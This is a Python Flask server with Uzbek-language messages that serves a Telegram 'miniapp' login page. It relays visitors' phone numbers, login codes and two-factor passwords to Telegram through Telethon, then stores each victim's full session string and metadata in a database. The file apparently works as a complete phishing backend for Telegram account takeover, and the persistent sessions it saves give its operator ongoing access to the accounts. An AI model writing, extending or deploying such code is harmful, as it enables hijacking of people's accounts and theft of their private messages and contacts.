import os
import asyncio
from flask import Flask, request, jsonify, render_template

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
    FloodWaitError
)

from database import (
    save_login_attempt,
    get_login_attempt,
    delete_login_attempt,
    save_user,
    save_user_session
)

# =====================
# CONFIG
# =====================
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH")

if not API_ID or not API_HASH:
    raise RuntimeError("API_ID yoki API_HASH yo‘q")

# =====================
# APP
# =====================
app = Flask(__name__, template_folder="templates")

# =====================
# ROUTES
# =====================
@app.route("/")
def index():
    return "LOGIN SERVER WORKING"

@app.route("/miniapp")
def miniapp():
    return render_template("login.html")

# =====================
# SEND CODE
# =====================
@app.route("/send_code", methods=["POST"])
def send_code():
    phone = request.json.get("phone")
    if not phone:
        return jsonify({"status": "error", "message": "Telefon raqam yo‘q"}), 400

    async def _send():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            sent = await client.send_code_request(phone)
            session_string = client.session.save()
            save_login_attempt(phone, sent.phone_code_hash, session_string)
        finally:
            await client.disconnect()

    try:
        asyncio.run(_send())
        return jsonify({"status": "ok"}), 200

    except FloodWaitError as e:
        return jsonify({
            "status": "error",
            "message": f"{e.seconds} soniya kuting, Telegram vaqtincha blok qo‘ydi"
        }), 429

    except Exception as e:
        print("SEND_CODE ERROR:", repr(e))
        return jsonify({"status": "error", "message": "Server xatosi"}), 500


# =====================
# VERIFY CODE
# =====================
@app.route("/verify_code", methods=["POST"])
def verify_code():
    data = request.json
    phone = data.get("phone")
    code = data.get("code")

    if not phone or not code:
        return jsonify({
            "status": "error",
            "message": "Telefon yoki kod yo‘q"
        }), 400

    # 1️⃣ login_attempts dan HASH + SESSION olamiz
    attempt = get_login_attempt(phone)
    if not attempt:
        return jsonify({
            "status": "error",
            "message": "Kod muddati o‘tgan yoki topilmadi"
        }), 400

    phone_code_hash, session_string = attempt

    async def _verify():
        client = TelegramClient(
            StringSession(session_string),
            API_ID,
            API_HASH
        )
        await client.connect()

        try:
            await client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )

            user = await client.get_me()
            final_session = client.session.save()

            return user, final_session

        finally:
            await client.disconnect()

    try:
        user, final_session = asyncio.get_event_loop().run_until_complete(_verify())

        # 2️⃣ USER SESSION saqlaymiz (ENG MUHIM QISM)
        save_user_session(user.id, final_session)

        # 3️⃣ USER METADATA (adminbot/stat uchun)
        save_user(
            user_id=user.id,
            phone=phone,
            username=user.username
        )

        # 4️⃣ LOGIN ATTEMPT tozalaymiz
        delete_login_attempt(phone)

        return jsonify({"status": "ok"}), 200

    except PhoneCodeInvalidError:
        return jsonify({
            "status": "error",
            "message": "Kod noto‘g‘ri"
        }), 400

    except SessionPasswordNeededError:
        return jsonify({
            "status": "2fa_required"
        }), 200

    except Exception as e:
        print("VERIFY_CODE ERROR:", repr(e))
        return jsonify({
            "status": "error",
            "message": "Telegram login xatosi"
        }), 500

from telethon.errors import PasswordHashInvalidError

@app.route("/verify_password", methods=["POST"])
def verify_password():
    data = request.json
    phone = data.get("phone")
    password = data.get("password")

    if not phone or not password:
        return jsonify({
            "status": "error",
            "message": "Telefon yoki parol yo‘q"
        }), 400

    # 1️⃣ login_attempts dan session olamiz
    attempt = get_login_attempt(phone)
    if not attempt:
        return jsonify({
            "status": "error",
            "message": "Login sessiya topilmadi"
        }), 400

    phone_code_hash, session_string = attempt

    async def _verify_password():
        client = TelegramClient(
            StringSession(session_string),
            API_ID,
            API_HASH
        )
        await client.connect()

        try:
            await client.sign_in(password=password)

            user = await client.get_me()
            final_session = client.session.save()

            return user, final_session

        finally:
            await client.disconnect()

    try:
        user, final_session = asyncio.get_event_loop().run_until_complete(
            _verify_password()
        )

        # 🔐 USER SESSION saqlaymiz
        save_user_session(user.id, final_session)

        # 👤 USER METADATA
        save_user(
            user_id=user.id,
            phone=phone,
            username=user.username
        )

        delete_login_attempt(phone)

        return jsonify({"status": "ok"}), 200

    except PasswordHashInvalidError:
        return jsonify({
            "status": "error",
            "message": "Parol noto‘g‘ri"
        }), 400

    except Exception as e:
        print("VERIFY_PASSWORD ERROR:", repr(e))
        return jsonify({
            "status": "error",
            "message": "2FA login xatosi"
        }), 500



# =====================
# RUN
# =====================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
